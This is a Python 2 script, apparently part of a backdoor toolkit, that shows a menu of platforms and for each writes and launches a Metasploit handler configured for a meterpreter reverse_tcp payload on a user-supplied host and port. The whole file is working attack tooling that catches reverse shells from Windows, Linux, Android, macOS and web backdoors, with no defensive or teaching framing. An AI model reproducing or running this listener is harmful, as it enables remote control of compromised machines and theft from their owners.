import os 
def listener():
	print("""

_______________          |*\_/*|________ 
|  ___________  |        ||_/-\_|______  | 
| |           | |        | |           | | 
| |   0   0   | |        | |   0   0   | | 
| |     -     | |-> -> ->| |     -     | | 
| |   \___/   | |        | |   \___/   | | 
| |___     ___| |        | |___________| | 
|_____|\_/|_____|        |_______________| 
 _|__|/ \|_|_.............._|________|_
/ ********** \            / ********** \ 
 ************ \          / ************ \ 	    

	1. Listener for Windows Backdoor
	2. Listener for Linux Backdoor
	3. Listener for Android Backdoor
	4. Listener for MacOS Backdoor
	5. Listener for Web Backdoor

	""")
	ch = raw_input("Which Backdoor You want to set Listener For? #~: ")
	if(ch=="1"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload windows/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener.rc')
	if(ch=="2"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener2.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload python/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener2.rc') 
	if(ch=="3"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener3.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload android/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener3.rc') 
	if(ch=="4"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener4.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload java/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener4.rc') 
	if(ch=="5"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener5.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload php/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener5.rc')  
